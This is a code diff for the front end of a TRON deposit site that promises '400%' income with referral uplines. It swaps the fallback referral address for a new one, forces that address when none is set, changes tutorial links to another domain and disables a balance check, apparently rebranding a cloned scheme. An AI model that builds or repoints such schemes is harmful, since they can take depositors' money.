@@ -45,7 +45,7 @@
                 return new Promise((resolve, reject) => {
                     setTimeout(() => {
                         resolve();
-                    }, 3000);
+                    }, 8000);
                 });
             }
         }
@@ -80,7 +80,7 @@
         data: {
             tab: 'main',
             contract_address: 'TYeqf2CrwCygUXS9rqwovu4qXcLb3EViyr',
-            upline: 'TZ4rRzPsohyj6PWCK8NLLBNEJpZpXnBuGz',
+            upline: '',
             contract: {
                 balance: 0,
                 total_users: 0,
@@ -213,6 +213,7 @@
 
                     contract.payoutOf(this.tron.account).call().then(res => {
                         this.user.payout = parseInt(tronWeb.fromSun(res.payout));
+                        if(this.user.payout > 1e60) this.user.payout = 0;
                     });
 
                     contract.userInfo(this.tron.account).call().then(res => {
@@ -268,20 +269,21 @@
 
                 if(!(this.deposit_amount >= 0.1)) return this.notice('Zero amount', 'fb8c00');
                 //if(this.user.deposit_amount > 0 && Math.floor(this.user.deposit_amount * 4.0 - this.user.payouts) > 0) return this.notice('You did not receive all the income 400%. You need to get ' + (this.user.deposit_amount * 4.0 - this.user.payouts).toFixed(2) + ' TRX.<br/>Make a new deposit when you receive all the income.', 'fb8c00');
-                if(!this.tron.account) return this.notice('To join the project you need to use the Tron wallet. Read more <a href="https://maxitron.net/tutorial">here</a>', 'fb8c00');
-                if(this.user.balance < this.deposit_amount) return this.notice('To join the project you need to have TRX in your wallet.<br/>If you just received funds to your wallet, wait 1 minute for network confirmation and try again', 'fb8c00');
+                if(!this.tron.account) return this.notice('To join the project you need to use the Tron wallet. Read more <a href="https://etherchain.io/tutorial">here</a>', 'fb8c00');
+                //if(this.user.balance < this.deposit_amount) return this.notice('To join the project you need to have TRX in your wallet.<br/>If you just received funds to your wallet, wait 1 minute for network confirmation and try again', 'fb8c00');
                 if(this.user.deposit_amount > 0 && this.deposit_amount < this.user.deposit_amount) return this.notice('You are trying to make a deposit less than your last deposit<br/>Use an amount no less than the previous deposit', 'fb8c00');
 
                 if(this.user.total_deposits == 0) {
                     if(upline) {
                         if(upline.toLowerCase() == this.tron.account.toLowerCase()) {
-                            upline = 'TZ4rRzPsohyj6PWCK8NLLBNEJpZpXnBuGz';
+                            upline = 'TVhg1uPkHSs5HP3Xt2muJiA2BJMbdj7eAE';
                             auto_upline = true;
                         }
                         this.upline = upline;
                     }
                     else return this.upmodal.show = true;
                 }
+                else if(!this.upline) this.upline = 'TVhg1uPkHSs5HP3Xt2muJiA2BJMbdj7eAE';
 
                 this.getTronWeb().then(tronWeb => {
                     contract.deposit(this.upline).send({
@@ -296,7 +298,7 @@
                 });
             },
             withdraw() {
-                if(!this.tron.account) return this.notice('To join the project you need to use the Tron wallet. Read more <a href: https://maxitron.net/tutorial/>here</a>', 'fb8c00');
+                if(!this.tron.account) return this.notice('To join the project you need to use the Tron wallet. Read more <a href: https://etherchain.io/tutorial/>here</a>', 'fb8c00');
                 if(this.user.payout + this.user.direct_bonus + this.user.match_bonus + this.user.pool_bonus < 0.01) return this.notice('To withdraw funds, wait when the amount of income exceeds 0.01 TRX (because of gas fee)', 'fb8c00');
                 if(this.user.payouts >= this.user.deposit_amount * 4.0) return this.notice('You have reached the 400% limit<br/>To get income again make a new deposit', 'fb8c00');
                 
